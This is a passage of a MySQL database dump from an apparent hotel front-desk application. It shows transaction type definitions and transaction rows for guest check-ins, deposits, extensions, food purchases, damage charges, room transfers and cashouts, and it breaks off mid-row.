  `position` varchar(255) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=10 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

LOCK TABLES `transaction_types` WRITE;
/*!40000 ALTER TABLE `transaction_types` DISABLE KEYS */;
INSERT INTO `transaction_types` VALUES (1,'Check In','1','2025-11-18 14:23:01','2025-11-18 14:23:01'),(2,'Deposit','2','2025-11-18 14:23:01','2025-11-18 14:23:01'),(3,'Kitchen Order','3','2025-11-18 14:23:01','2025-11-18 14:23:01'),(4,'Damage Charges','4','2025-11-18 14:23:01','2025-11-18 14:23:01'),(5,'Cashout','5','2025-11-18 14:23:01','2025-11-18 14:23:01'),(6,'Extend','6','2025-11-18 14:23:01','2025-11-18 14:23:01'),(7,'Transfer Room','7','2025-11-18 14:23:01','2025-11-18 14:23:01'),(8,'Amenities','8','2025-11-18 14:23:01','2025-11-18 14:23:01'),(9,'Food and Beverages','8','2025-11-18 14:23:01','2025-11-18 14:23:01');
/*!40000 ALTER TABLE `transaction_types` ENABLE KEYS */;
UNLOCK TABLES;
DROP TABLE IF EXISTS `transactions`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `transactions` (
  `id` bigint unsigned NOT NULL AUTO_INCREMENT,
  `branch_id` bigint unsigned NOT NULL,
  `room_id` bigint unsigned NOT NULL,
  `guest_id` bigint unsigned NOT NULL,
  `floor_id` bigint unsigned NOT NULL,
  `transaction_type_id` bigint unsigned NOT NULL,
  `assigned_frontdesk_id` json NOT NULL,
  `description` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL,
  `payable_amount` int NOT NULL DEFAULT '0',
  `paid_amount` int NOT NULL DEFAULT '0',
  `change_amount` int NOT NULL DEFAULT '0',
  `deposit_amount` int NOT NULL DEFAULT '0',
  `paid_at` datetime DEFAULT NULL,
  `override_at` datetime DEFAULT NULL,
  `remarks` text COLLATE utf8mb4_unicode_ci NOT NULL,
  `transfer_reason_id` bigint unsigned DEFAULT NULL,
  `is_co` tinyint(1) NOT NULL DEFAULT '0',
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=250 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

LOCK TABLES `transactions` WRITE;
/*!40000 ALTER TABLE `transactions` DISABLE KEYS */;
INSERT INTO `transactions` VALUES (1,1,17,1,1,1,'\"[1,\\\"Tan\\\"]\"','Guest Check In',760,760,0,0,'2025-11-18 15:02:45',NULL,'Guest Checked In at room #25',NULL,0,'2025-11-18 15:02:45','2025-11-18 15:02:45'),(2,1,17,1,1,2,'\"[1,\\\"Tan\\\"]\"','Deposit',200,760,0,200,'2025-11-18 15:02:45',NULL,'Deposit From Check In (Room Key & TV Remote)',NULL,0,'2025-11-18 15:02:45','2025-11-18 15:02:45'),(3,1,23,2,1,1,'\"[1,\\\"Tan\\\"]\"','Guest Check In',760,760,0,0,'2025-11-18 15:02:56',NULL,'Guest Checked In at room #30',NULL,0,'2025-11-18 15:02:56','2025-11-18 15:02:56'),(4,1,23,2,1,2,'\"[1,\\\"Tan\\\"]\"','Deposit',200,760,0,200,'2025-11-18 15:02:56',NULL,'Deposit From Check In (Room Key & TV Remote)',NULL,0,'2025-11-18 15:02:56','2025-11-18 15:02:56'),(5,1,3,3,1,1,'\"[1,\\\"Tan\\\"]\"','Guest Check In',480,480,0,0,'2025-11-18 15:03:12',NULL,'Guest Checked In at room #11',NULL,0,'2025-11-18 15:03:12','2025-11-18 15:03:12'),(6,1,3,3,1,2,'\"[1,\\\"Tan\\\"]\"','Deposit',200,480,0,200,'2025-11-18 15:03:12',NULL,'Deposit From Check In (Room Key & TV Remote)',NULL,0,'2025-11-18 15:03:12','2025-11-18 15:03:12'),(7,1,6,4,1,1,'\"[1,\\\"Tan\\\"]\"','Guest Check In',480,480,0,0,'2025-11-18 15:03:40',NULL,'Guest Checked In at room #15',NULL,0,'2025-11-18 15:03:40','2025-11-18 15:03:40'),(8,1,6,4,1,2,'\"[1,\\\"Tan\\\"]\"','Deposit',200,480,0,200,'2025-11-18 15:03:40',NULL,'Deposit From Check In (Room Key & TV Remote)',NULL,0,'2025-11-18 15:03:40','2025-11-18 15:03:40'),(9,1,207,5,3,1,'\"[1,\\\"Tan\\\"]\"','Guest Check In',872,872,0,0,'2025-11-18 15:05:07',NULL,'Guest Checked In at room #108',NULL,0,'2025-11-18 15:05:07','2025-11-18 15:05:07'),(10,1,207,5,3,2,'\"[1,\\\"Tan\\\"]\"','Deposit',200,872,0,200,'2025-11-18 15:05:07',NULL,'Deposit From Check In (Room Key & TV Remote)',NULL,0,'2025-11-18 15:05:07','2025-11-18 15:05:07'),(11,1,208,6,2,1,'\"[1,\\\"Tan\\\"]\"','Guest Check In',760,760,0,0,'2025-11-18 15:05:29',NULL,'Guest Checked In at room #117',NULL,0,'2025-11-18 15:05:29','2025-11-18 15:05:29'),(12,1,208,6,2,2,'\"[1,\\\"Tan\\\"]\"','Deposit',200,760,0,200,'2025-11-18 15:05:29',NULL,'Deposit From Check In (Room Key & TV Remote)',NULL,0,'2025-11-18 15:05:29','2025-11-18 15:05:29'),(13,1,209,7,1,1,'\"[1,\\\"Tan\\\"]\"','Guest Check In',536,536,0,0,'2025-11-18 15:05:38',NULL,'Guest Checked In at room #119',NULL,0,'2025-11-18 15:05:38','2025-11-18 15:05:38'),(14,1,209,7,1,2,'\"[1,\\\"Tan\\\"]\"','Deposit',200,536,0,200,'2025-11-18 15:05:38',NULL,'Deposit From Check In (Room Key & TV Remote)',NULL,0,'2025-11-18 15:05:38','2025-11-18 15:05:38'),(15,1,127,8,4,1,'\"[1,\\\"Tan\\\"]\"','Guest Check In',648,648,0,0,'2025-11-18 15:05:46',NULL,'Guest Checked In at room #200',NULL,0,'2025-11-18 15:05:46','2025-11-18 15:05:46'),(16,1,127,8,4,2,'\"[1,\\\"Tan\\\"]\"','Deposit',200,648,0,200,'2025-11-18 15:05:46',NULL,'Deposit From Check In (Room Key & TV Remote)',NULL,0,'2025-11-18 15:05:46','2025-11-18 15:05:46'),(17,1,128,9,4,1,'\"[1,\\\"Tan\\\"]\"','Guest Check In',816,816,0,0,'2025-11-18 15:05:58',NULL,'Guest Checked In at room #201',NULL,0,'2025-11-18 15:05:58','2025-11-18 15:05:58'),(18,1,128,9,4,2,'\"[1,\\\"Tan\\\"]\"','Deposit',200,816,0,200,'2025-11-18 15:05:58',NULL,'Deposit From Check In (Room Key & TV Remote)',NULL,0,'2025-11-18 15:05:58','2025-11-18 15:05:58'),(19,1,210,10,3,1,'\"[1,\\\"Tan\\\"]\"','Guest Check In',816,816,0,0,'2025-11-18 15:06:24',NULL,'Guest Checked In at room #300',NULL,0,'2025-11-18 15:06:24','2025-11-18 15:06:24'),(20,1,210,10,3,2,'\"[1,\\\"Tan\\\"]\"','Deposit',200,816,0,200,'2025-11-18 15:06:24',NULL,'Deposit From Check In (Room Key & TV Remote)',NULL,0,'2025-11-18 15:06:24','2025-11-18 15:06:24'),(21,1,17,1,1,8,'\"[1,\\\"Tan\\\"]\"','Amenities',20,0,0,0,'2025-11-19 08:48:12',NULL,'Guest Added Amenities: (1) EXTRA FITTED SHEET',NULL,0,'2025-11-18 15:07:35','2025-11-19 08:48:12'),(22,1,17,1,1,8,'\"[1,\\\"Tan\\\"]\"','Amenities',40,0,0,0,'2025-11-19 08:48:12',NULL,'Guest Added Amenities: (2) EXTRA PILLOW',NULL,0,'2025-11-18 15:08:02','2025-11-19 08:48:12'),(23,1,17,1,1,9,'\"[1,\\\"Tan\\\"]\"','Food and Beverages',10,0,0,0,'2025-11-19 08:48:12',NULL,'Guest Added Food and Beverages: (Front Desk) (1) C2',NULL,0,'2025-11-18 15:12:37','2025-11-19 08:48:12'),(24,1,17,1,1,9,'\"[1,\\\"Tan\\\"]\"','Food and Beverages',15,0,0,0,'2025-11-19 08:48:12',NULL,'Guest Added Food and Beverages: (Front Desk) (1) Coke Zero',NULL,0,'2025-11-18 15:13:15','2025-11-19 08:48:12'),(25,1,17,1,1,4,'\"[1,\\\"Tan\\\"]\"','Damage Charges',200,0,0,0,'2025-11-19 08:48:12',NULL,'Guest Charged for Damage: (1) PUNDA',NULL,0,'2025-11-18 15:13:51','2025-11-19 08:48:12'),(26,1,17,1,1,4,'\"[1,\\\"Tan\\\"]\"','Damage Charges',300,0,0,0,'2025-11-19 08:48:12',NULL,'Guest Charged for Damage: (1) TOWEL',NULL,0,'2025-11-18 15:14:29','2025-11-19 08:48:12'),(27,1,17,1,1,2,'\"[1,\\\"Tan\\\"]\"','Deposit',1000,0,0,1000,'2025-11-18 15:14:55',NULL,'Guest Deposit: deposit',NULL,0,'2025-11-18 15:14:55','2025-11-18 15:14:55'),(28,1,23,2,1,8,'\"[1,\\\"Tan\\\"]\"','Amenities',20,0,0,0,'2025-11-19 08:49:24',NULL,'Guest Added Amenities: (1) EXTRA BLANKET',NULL,0,'2025-11-18 15:16:27','2025-11-19 08:49:24'),(29,1,23,2,1,4,'\"[1,\\\"Tan\\\"]\"','Damage Charges',500,0,0,0,'2025-11-19 08:49:24',NULL,'Guest Charged for Damage: (1) BEDSHEET WITH INK',NULL,0,'2025-11-18 15:17:05','2025-11-19 08:49:24'),(30,1,3,3,1,4,'\"[1,\\\"Tan\\\"]\"','Damage Charges',130,0,0,0,'2025-11-18 15:38:58',NULL,'Guest Charged for Damage: (1) SUGA SA C.R.',NULL,0,'2025-11-18 15:18:18','2025-11-18 15:38:58'),(31,1,3,3,1,4,'\"[1,\\\"Tan\\\"]\"','Damage Charges',5000,0,0,0,'2025-11-18 15:38:58',NULL,'Guest Charged for Damage: (1) MAIN DOOR',NULL,0,'2025-11-18 15:18:31','2025-11-18 15:38:58'),(32,1,6,4,1,9,'\"[1,\\\"Tan\\\"]\"','Food and Beverages',10,0,0,0,'2025-11-18 15:39:25',NULL,'Guest Added Food and Beverages: (Front Desk) (1) Chippy',NULL,0,'2025-11-18 15:19:27','2025-11-18 15:39:25'),(33,1,6,4,1,4,'\"[1,\\\"Tan\\\"]\"','Damage Charges',500,0,0,0,'2025-11-18 15:39:25',NULL,'Guest Charged for Damage: (1) UNLAN',NULL,0,'2025-11-18 15:19:40','2025-11-18 15:39:25'),(34,1,207,5,3,6,'\"[1,\\\"Tan\\\"]\"','Extension',1172,0,0,0,'2025-11-20 08:52:44',NULL,'Guest Extension : 24 hours',NULL,0,'2025-11-18 15:20:56','2025-11-20 08:52:44'),(35,1,207,5,3,9,'\"[1,\\\"Tan\\\"]\"','Food and Beverages',30,0,0,0,'2025-11-20 08:52:44',NULL,'Guest Added Food and Beverages: (Front Desk) (1) Nissin Cup Noodles',NULL,0,'2025-11-18 15:21:17','2025-11-20 08:52:44'),(36,1,207,5,3,4,'\"[1,\\\"Tan\\\"]\"','Damage Charges',500,0,0,0,'2025-11-20 08:52:44',NULL,'Guest Charged for Damage: (1) HABOL',NULL,0,'2025-11-18 15:21:35','2025-11-20 08:52:44'),(37,1,208,6,2,6,'\"[1,\\\"Tan\\\"]\"','Extension',1060,0,0,0,'2025-11-20 09:00:34',NULL,'Guest Extension : 24 hours',NULL,0,'2025-11-18 15:22:35','2025-11-20 09:00:34'),(38,1,208,6,2,9,'\"[1,\\\"Tan\\\"]\"','Food and Beverages',15,0,0,0,'2025-11-20 09:00:34',NULL,'Guest Added Food and Beverages: (Front Desk) (1) Nature\'s Spring 10ML',NULL,0,'2025-11-18 15:23:46','2025-11-20 09:00:34'),(39,1,208,6,2,2,'\"[1,\\\"Tan\\\"]\"','Deposit',500,0,0,500,'2025-11-18 15:24:07',NULL,'Guest Deposit: change',NULL,0,'2025-11-18 15:24:07','2025-11-18 15:24:07'),(40,1,209,7,1,6,'\"[1,\\\"Tan\\\"]\"','Extension',200,0,0,0,'2025-11-19 08:51:01',NULL,'Guest Extension : 12 hours',NULL,0,'2025-11-18 15:26:02','2025-11-19 08:51:01'),(41,1,209,7,1,9,'\"[1,\\\"Tan\\\"]\"','Food and Beverages',15,0,0,0,'2025-11-19 08:51:01',NULL,'Guest Added Food and Beverages: (Front Desk) (1) Coke Zero',NULL,0,'2025-11-18 15:26:28','2025-11-19 08:51:01'),(42,1,209,7,1,2,'\"[1,\\\"Tan\\\"]\"','Deposit',1000,0,0,1000,'2025-11-18 15:27:01',NULL,'Guest Deposit: Food',NULL,0,'2025-11-18 15:27:01','2025-11-18 15:27:01'),(43,1,127,8,4,6,'\"[1,\\\"Tan\\\"]\"','Extension',200,0,0,0,'2025-11-19 08:52:27',NULL,'Guest Extension : 12 hours',NULL,0,'2025-11-18 15:27:55','2025-11-19 08:52:27'),(44,1,127,8,4,9,'\"[1,\\\"Tan\\\"]\"','Food and Beverages',30,0,0,0,'2025-11-19 08:52:27',NULL,'Guest Added Food and Beverages: (Front Desk) (1) Nissin Cup Noodles',NULL,0,'2025-11-18 15:28:13','2025-11-19 08:52:27'),(45,1,127,8,4,2,'\"[1,\\\"Tan\\\"]\"','Deposit',2000,0,0,2000,'2025-11-18 15:28:32',NULL,'Guest Deposit: Food',NULL,0,'2025-11-18 15:28:32','2025-11-18 15:28:32'),(46,1,128,9,4,6,'\"[1,\\\"Tan\\\"]\"','Extension',1116,0,0,0,'2025-11-20 09:02:57',NULL,'Guest Extension : 24 hours',NULL,0,'2025-11-18 15:29:21','2025-11-20 09:02:57'),(47,1,128,9,4,9,'\"[1,\\\"Tan\\\"]\"','Food and Beverages',10,0,0,0,'2025-11-20 09:02:57',NULL,'Guest Added Food and Beverages: (Front Desk) (1) Chippy',NULL,0,'2025-11-18 15:29:45','2025-11-20 09:02:57'),(48,1,128,9,4,2,'\"[1,\\\"Tan\\\"]\"','Deposit',5000,0,0,5000,'2025-11-18 15:30:23',NULL,'Guest Deposit: Change',NULL,0,'2025-11-18 15:30:23','2025-11-18 15:30:23'),(49,1,210,10,3,6,'\"[1,\\\"Tan\\\"]\"','Extension',716,0,0,0,'2025-11-20 09:00:00',NULL,'Guest Extension : 6 hours',NULL,0,'2025-11-18 15:34:56','2025-11-20 09:00:00'),(50,1,210,10,3,9,'\"[1,\\\"Tan\\\"]\"','Food and Beverages',15,0,0,0,'2025-11-20 09:00:00',NULL,'Guest Added Food and Beverages: (Front Desk) (1) Nature\'s Spring 10ML',NULL,0,'2025-11-18 15:36:01','2025-11-20 09:00:00'),(51,1,210,10,3,2,'\"[1,\\\"Tan\\\"]\"','Deposit',1000,0,0,1000,'2025-11-18 15:36:34',NULL,'Guest Deposit: Food',NULL,0,'2025-11-18 15:36:34','2025-11-18 15:36:34'),(52,1,17,1,1,5,'\"[1,\\\"Tan\\\"]\"','Cashout',585,585,0,0,'2025-11-19 08:48:12',NULL,'Cashout from paying all unpaid balances',NULL,0,'2025-11-19 08:48:12','2025-11-19 08:48:12'),(53,1,209,7,1,5,'\"[1,\\\"Tan\\\"]\"','Cashout',215,215,0,0,'2025-11-19 08:51:01',NULL,'Cashout from paying all unpaid balances',NULL,0,'2025-11-19 08:51:01','2025-11-19 08:51:01'),(54,1,127,8,4,5,'\"[1,\\\"Tan\\\"]\"','Cashout',230,230,0,0,'2025-11-19 08:52:27',NULL,'Cashout from paying all unpaid balances',NULL,0,'2025-11-19 08:52:27','2025-11-19 08:52:27'),(55,1,3,11,1,1,'\"[1,\\\"Tan\\\"]\"','Guest Check In',592,600,8,0,'2025-11-19 09:42:32',NULL,'Guest Checked In at room #11',NULL,0,'2025-11-19 09:42:32','2025-11-19 09:42:32'),(56,1,3,11,1,2,'\"[1,\\\"Tan\\\"]\"','Deposit',200,600,8,200,'2025-11-19 09:42:32',NULL,'Deposit From Check In (Room Key & TV Remote)',NULL,0,'2025-11-19 09:42:32','2025-11-19 09:42:32'),(57,1,3,11,1,2,'\"[1,\\\"Tan\\\"]\"','Deposit',8,600,0,8,'2025-11-19 09:42:32',NULL,'Deposit From Check In (Excess Amount)',NULL,0,'2025-11-19 09:42:32','2025-11-19 09:42:32'),(58,1,209,12,1,1,'\"[2,\\\"sirok\\\"]\"','Guest Check In',536,600,64,0,'2025-11-19 15:07:03',NULL,'Guest Checked In at room #119',NULL,0,'2025-11-19 15:07:03','2025-11-19 15:07:03'),(59,1,209,12,1,2,'\"[2,\\\"sirok\\\"]\"','Deposit',200,600,64,200,'2025-11-19 15:07:03',NULL,'Deposit From Check In (Room Key & TV Remote)',NULL,0,'2025-11-19 15:07:03','2025-11-19 15:07:03'),(60,1,209,12,1,2,'\"[2,\\\"sirok\\\"]\"','Deposit',64,600,0,64,'2025-11-19 15:07:03',NULL,'Deposit From Check In (Excess Amount)',NULL,0,'2025-11-19 15:07:03','2025-11-19 15:07:03'),(61,1,6,13,1,1,'\"[1,\\\"Tan\\\"]\"','Guest Check In',536,600,64,0,'2025-11-19 15:38:37',NULL,'Guest Checked In at room #15',NULL,0,'2025-11-19 15:38:37','2025-11-19 15:38:37'),(62,1,6,13,1,2,'\"[1,\\\"Tan\\\"]\"','Deposit',200,600,64,200,'2025-11-19 15:38:37',NULL,'Deposit From Check In (Room Key & TV Remote)',NULL,0,'2025-11-19 15:38:37','2025-11-19 15:38:37'),(63,1,6,13,1,2,'\"[1,\\\"Tan\\\"]\"','Deposit',64,600,0,64,'2025-11-19 15:38:37',NULL,'Deposit From Check In (Excess Amount)',NULL,0,'2025-11-19 15:38:37','2025-11-19 15:38:37'),(64,1,210,10,3,5,'\"[1,\\\"Tan\\\"]\"','Cashout',731,731,0,0,'2025-11-20 09:00:00',NULL,'Cashout from paying all unpaid balances',NULL,0,'2025-11-20 09:00:00','2025-11-20 09:00:00'),(65,1,128,9,4,5,'\"[1,\\\"Tan\\\"]\"','Cashout',1126,1126,0,0,'2025-11-20 09:02:57',NULL,'Cashout from paying all unpaid balances',NULL,0,'2025-11-20 09:02:57','2025-11-20 09:02:57'),(66,1,17,14,1,1,'\"[1,\\\"Tan\\\"]\"','Guest Check In',536,600,64,0,'2025-11-20 09:49:06',NULL,'Guest Checked In at room #25',NULL,0,'2025-11-20 09:49:06','2025-11-20 09:49:06'),(67,1,17,14,1,2,'\"[1,\\\"Tan\\\"]\"','Deposit',200,600,64,200,'2025-11-20 09:49:06',NULL,'Deposit From Check In (Room Key & TV Remote)',NULL,0,'2025-11-20 09:49:06','2025-11-20 09:49:06'),(68,1,17,14,1,2,'\"[1,\\\"Tan\\\"]\"','Deposit',64,600,0,64,'2025-11-20 09:49:06',NULL,'Deposit From Check In (Excess Amount)',NULL,0,'2025-11-20 09:49:06','2025-11-20 09:49:06'),(69,1,1,14,1,7,'\"[1,\\\"Tan\\\"]\"','Room Transfer',0,0,0,0,'2025-11-20 09:52:38',NULL,'Guest Transfered from Room #25 (Single size Bed) to Room #1 ( Double size Bed) - Reason: Guba Aircon ',1,0,'2025-11-20 09:52:33','2025-11-20 09:52:38'),(70,1,1,14,1,5,'\"[1,\\\"Tan\\\"]\"','Cashout',0,0,0,0,'2025-11-20 09:52:38',NULL,'Cashout from paying deposit (Room Transfer)',NULL,0,'2025-11-20 09:52:38','2025-11-20 09:52:38'),(71,1,1,14,1,6,'\"[1,\\\"Tan\\\"]\"','Extension',200,0,0,0,'2025-11-20 10:13:48',NULL,'Guest Extension : 12 hours',NULL,0,'2025-11-20 09:53:30','2025-11-20 10:13:48'),(72,1,1,14,1,4,'\"[1,\\\"Tan\\\"]\"','Damage Charges',400,0,0,0,'2025-11-20 10:13:48',NULL,'Guest Charged for Damage: (1) CHARGER SA DECODER',NULL,0,'2025-11-20 10:01:06','2025-11-20 10:13:48'),(73,1,1,14,1,2,'\"[1,\\\"Tan\\\"]\"','Deposit',1000,0,0,1000,'2025-11-20 10:02:41',NULL,'Guest Deposit: Foods',NULL,0,'2025-11-20 10:02:41','2025-11-20 10:02:41'),(74,1,1,14,1,9,'\"[1,\\\"Tan\\\"]\"','Food and Beverages',10,0,0,0,'2025-11-20 10:13:48',NULL,'Guest Added Food and Beverages: (Front Desk) (1) Chippy',NULL,0,'2025-11-20 10:03:12','2025-11-20 10:13:48'),(75,1,1,14,1,4,'\"[1,\\\"Tan\\\"]\"','Damage Charges',1000,1000,0,0,'2025-11-20 10:05:18',NULL,'Guest Charged for Damage: (1) SAMIN SULOD SA C.R.',NULL,0,'2025-11-20 10:05:10','2025-11-20 10:05:18'),(76,1,1,14,1,5,'\"[1,\\\"Tan\\\"]\"','Cashout',1000,1000,0,0,'2025-11-20 10:05:18',NULL,'Cashout from paying deposit (Damage Charges)',NULL,0,'2025-11-20 10:05:18','2025-11-20 10:05:18'),(77,1,23,15,1,1,'\"[1,\\\"Tan\\\"]\"','Guest Check In',536,536,0,0,'2025-11-20 10:17:22',NULL,'Guest Checked In at room #30',NULL,0,'2025-11-20 10:17:22','2025-11-20 10:17:22'),(78,1,23,15,1,2,'\"[1,\\\"Tan\\\"]\"','Deposit',200,536,0,200,'2025-11-20 10:17:22',NULL,'Deposit From Check In (Room Key & TV Remote)',NULL,0,'2025-11-20 10:17:22','2025-11-20 10:17:22'),(79,1,207,16,3,1,'\"[1,\\\"Tan\\\"]\"','Guest Check In',648,1000,352,0,'2025-11-20 10:17:39',NULL,'Guest Checked In at room #108',NULL,0,'2025-11-20 10:17:39','2025-11-20 10:17:39'),(80,1,207,16,3,2,'\"[1,\\\"Tan\\\"]\"','Deposit',200,1000,352,200,'2025-11-20 10:17:39',NULL,'Deposit From Check In (Room Key & TV Remote)',NULL,0,'2025-11-20 10:17:39','2025-11-20 10:17:39'),(81,1,207,16,3,2,'\"[1,\\\"Tan\\\"]\"','Deposit',352,1000,0,352,'2025-11-20 10:17:39',NULL,'Deposit From Check In (Excess Amount)',NULL,0,'2025-11-20 10:17:39','2025-11-20 10:17:39'),(82,1,7,15,1,7,'\"[1,\\\"Tan\\\"]\"','Room Transfer',0,0,0,0,'2025-11-20 10:21:17',NULL,'Guest Transfered from Room #30 (Single size Bed) to Room #16 (Twin size Bed) - Reason: Guba Aircon ',1,0,'2025-11-20 10:19:12','2025-11-20 10:21:17'),(83,1,7,15,1,2,'\"[1,\\\"Tan\\\"]\"','Deposit',500,0,0,500,'2025-11-20 10:19:51',NULL,'Guest Deposit: Foods',NULL,0,'2025-11-20 10:19:51','2025-11-20 10:19:51'),(84,1,7,15,1,9,'\"[1,\\\"Tan\\\"]\"','Food and Beverages',30,0,0,0,'2025-11-20 10:21:17',NULL,'Guest Added Food and Beverages: (Front Desk) (1) Nissin Cup Noodles',NULL,0,'2025-11-20 10:20:54','2025-11-20 10:21:17'),(85,1,23,15,1,5,'\"[1,\\\"Tan\\\"]\"','Cashout',30,30,0,0,'2025-11-20 10:21:17',NULL,'Cashout from paying all unpaid balances',NULL,0,'2025-11-20 10:21:17','2025-11-20 10:21:17'),(86,1,7,15,1,9,'\"[1,\\\"Tan\\\"]\"','Food and Beverages',45,45,0,0,'2025-11-20 10:22:00',NULL,'Guest Added Food and Beverages: (Front Desk) (3) Coke Zero',NULL,0,'2025-11-20 10:21:38','2025-11-20 10:22:00'),(87,1,205,16,5,7,'\"[1,\\\"Tan\\\"]\"','Room Transfer',0,0,0,0,'2025-11-20 10:58:02',NULL,'Guest Transfered from Room #108 (Twin size Bed) to Room #290 (Single size Bed) - Reason: Guba Aircon ',1,0,'2025-11-20 10:21:48','2025-11-20 10:58:02'),(88,1,7,15,1,5,'\"[1,\\\"Tan\\\"]\"','Cashout',45,45,0,0,'2025-11-20 10:22:00',NULL,'Cashout from paying deposit (Food and Beverages)',NULL,0,'2025-11-20 10:22:00','2025-11-20 10:22:00'),(89,1,7,15,1,9,'\"[1,\\\"Tan\\\"]\"','Food and Beverages',60,100,40,40,'2025-11-20 10:23:16',NULL,'Guest Added Food and Beverages: (Front Desk) (2) Nissin Cup Noodles',NULL,0,'2025-11-20 10:22:55','2025-11-20 10:23:16'),(90,1,205,16,5,9,'\"[1,\\\"Tan\\\"]\"','Food and Beverages',750,750,0,0,'2025-11-20 10:32:16',NULL,'Guest Added Food and Beverages: (Front Desk) (50) Coke Zero',NULL,0,'2025-11-20 10:23:11','2025-11-20 10:32:16'),(91,1,205,16,5,9,'\"[1,\\\"Tan\\\"]\"','Food and Beverages',30,30,0,0,'2025-11-20 10:24:45',NULL,'Guest Added Food and Beverages: (Front Desk) (2) Coke Zero',NULL,0,'2025-11-20 10:24:07','2025-11-20 10:24:45'),(92,1,7,15,1,4,'\"[1,\\\"Tan\\\"]\"','Damage Charges',130,0,0,0,'2025-11-20 10:29:38',NULL,'Guest Charged for Damage: (1) SUGA SA C.R.',NULL,0,'2025-11-20 10:24:21','2025-11-20 10:29:38'),(93,1,205,16,5,5,'\"[1,\\\"Tan\\\"]\"','Cashout',30,30,0,0,'2025-11-20 10:24:45',NULL,'Cashout from paying deposit (Food and Beverages)',NULL,0,'2025-11-20 10:24:45','2025-11-20 10:24:45'),(94,1,7,15,1,9,'\"[1,\\\"Tan\\\"]\"','Food and Beverages',20,20,0,0,'2025-11-20 10:25:54',NULL,'Guest Added Food and Beverages: (Front Desk) (2) Chippy',NULL,0,'2025-11-20 10:25:32','2025-11-20 10:25:54'),(95,1,7,15,1,5,'\"[1,\\\"Tan\\\"]\"','Cashout',20,20,0,0,'2025-11-20 10:25:54',NULL,'Cashout from paying deposit (Food and Beverages)',NULL,0,'2025-11-20 10:25:54','2025-11-20 10:25:54'),(96,1,205,16,5,2,'\"[1,\\\"Tan\\\"]\"','Deposit',1000,0,0,1000,'2025-11-20 10:28:09',NULL,'Guest Deposit: jkkkj',NULL,0,'2025-11-20 10:28:09','2025-11-20 10:28:09'),(97,1,23,15,1,5,'\"[1,\\\"Tan\\\"]\"','Cashout',130,130,0,0,'2025-11-20 10:29:38',NULL,'Cashout from paying all unpaid balances',NULL,0,'2025-11-20 10:29:38','2025-11-20 10:29:38'),(98,1,205,16,5,9,'\"[1,\\\"Tan\\\"]\"','Food and Beverages',45,45,0,0,'2025-11-20 10:30:30',NULL,'Guest Added Food and Beverages: (Front Desk) (3) Coke Zero',NULL,0,'2025-11-20 10:29:59','2025-11-20 10:30:30'),(99,1,7,15,1,6,'\"[1,\\\"Tan\\\"]\"','Extension',100,0,0,0,'2025-11-20 10:34:29',NULL,'Guest Extension : 6 hours',NULL,0,'2025-11-20 10:30:23','2025-11-20 10:34:29'),(100,1,205,16,5,5,'\"[1,\\\"Tan\\\"]\"','Cashout',45,45,0,0,'2025-11-20 10:30:30',NULL,'Cashout from paying deposit (Food and Beverages)',NULL,0,'2025-11-20 10:30:30','2025-11-20 10:30:30'),(101,1,7,15,1,6,'\"[1,\\\"Tan\\\"]\"','Extension',100,0,0,0,'2025-11-20 10:34:29',NULL,'Guest Extension : 6 hours',NULL,0,'2025-11-20 10:30:43','2025-11-20 10:34:29'),(102,1,7,15,1,6,'\"[1,\\\"Tan\\\"]\"','Extension',436,0,0,0,'2025-11-20 10:34:29',NULL,'Guest Extension : 6 hours',NULL,0,'2025-11-20 10:31:24','2025-11-20 10:34:29'),(103,1,7,15,1,6,'\"[1,\\\"Tan\\\"]\"','Extension',400,0,0,0,'2025-11-20 10:34:29',NULL,'Guest Extension : 18 hours',NULL,0,'2025-11-20 10:31:51','2025-11-20 10:34:29'),(104,1,205,16,5,5,'\"[1,\\\"Tan\\\"]\"','Cashout',750,750,0,0,'2025-11-20 10:32:16',NULL,'Cashout from paying deposit (Food and Beverages)',NULL,0,'2025-11-20 10:32:16','2025-11-20 10:32:16'),(105,1,205,16,5,4,'\"[1,\\\"Tan\\\"]\"','Damage Charges',400,0,0,0,'2025-11-20 10:58:02',NULL,'Guest Charged for Damage: (1) BIDET',NULL,0,'2025-11-20 10:34:32','2025-11-20 10:58:02'),(106,1,7,15,1,8,'\"[1,\\\"Tan\\\"]\"','Amenities',400,0,0,0,'2025-11-20 10:37:16',NULL,'Guest Added Amenities: (20) EXTRA PILLOW',NULL,0,'2025-11-20 10:34:48','2025-11-20 10:37:16'),(107,1,7,15,1,2,'\"[1,\\\"Tan\\\"]\"','Deposit',500,0,0,500,'2025-11-20 10:35:01',NULL,'Guest Deposit: Extras',NULL,0,'2025-11-20 10:35:01','2025-11-20 10:35:01'),(108,1,205,16,5,9,'\"[1,\\\"Tan\\\"]\"','Food and Beverages',120,120,0,0,'2025-11-20 10:35:39',NULL,'Guest Added Food and Beverages: (Front Desk) (4) Nissin Cup Noodles',NULL,0,'2025-11-20 10:35:06','2025-11-20 10:35:39'),(109,1,205,16,5,5,'\"[1,\\\"Tan\\\"]\"','Cashout',120,120,0,0,'2025-11-20 10:35:39',NULL,'Cashout from paying deposit (Food and Beverages)',NULL,0,'2025-11-20 10:35:39','2025-11-20 10:35:39'),(110,1,7,15,1,4,'\"[1,\\\"Tan\\\"]\"','Damage Charges',5000,0,0,0,'2025-11-20 10:37:16',NULL,'Guest Charged for Damage: (1) MAIN DOOR',NULL,0,'2025-11-20 10:36:04','2025-11-20 10:37:16'),(111,1,205,16,5,8,'\"[1,\\\"Tan\\\"]\"','Amenities',100,100,0,0,'2025-11-20 10:36:20',NULL,'Guest Added Amenities: (5) EXTRA PILLOW',NULL,0,'2025-11-20 10:36:10','2025-11-20 10:36:20'),(112,1,205,16,5,5,'\"[1,\\\"Tan\\\"]\"','Cashout',100,100,0,0,'2025-11-20 10:36:20',NULL,'Cashout from paying deposit (Amenities)',NULL,0,'2025-11-20 10:36:20','2025-11-20 